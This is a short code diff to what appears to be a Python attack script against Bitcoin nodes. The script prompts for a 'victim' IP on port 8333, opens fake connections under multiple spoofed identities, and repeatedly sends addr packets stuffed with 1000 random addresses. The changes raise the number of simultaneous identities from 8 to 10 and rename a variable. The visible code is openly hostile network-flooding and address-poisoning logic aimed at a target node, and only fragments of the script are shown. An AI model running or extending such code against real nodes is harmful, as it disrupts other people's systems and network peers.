@@ -33,7 +33,7 @@ victim_ip = input('Enter victim\'s IP address: ')
 victim_port = 8333
 
 # How many identities should run simultaneously
-num_identities = 8
+num_identities = 10
 
 # While attacking the victim, wait this many seconds before sending each version message
 seconds_between_version_packets = 0.1
@@ -249,8 +249,8 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 # Send addr repeatedly, or only once per identity based on sendOnlyOneMessagePerIdentity
 def attack(socket, src_ip, src_port, dst_ip, dst_port, interface):
 	# Generate a new list of 1000 random IP addresses
-	example_addresses = [generate_random_address(networkType) for _ in range(1000)]
-	addr = addr_packet(example_addresses).to_bytes()
+	random_addresses = [generate_random_address(networkType) for _ in range(1000)]
+	addr = addr_packet(random_addresses).to_bytes()
 
 	if sendOnlyOneMessagePerIdentity:
 		try:
